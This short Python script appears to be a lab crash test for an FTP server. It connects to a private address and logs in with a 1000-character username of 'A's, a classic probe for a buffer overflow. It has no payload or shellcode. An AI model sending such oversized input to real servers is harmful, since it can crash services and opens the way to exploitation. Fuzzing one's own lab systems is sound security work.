from ftplib import FTP

ftp = FTP(host='192.168.201.130')
user = 'A' * 1000
passw = 'qqq'
ftp.login(user, passw)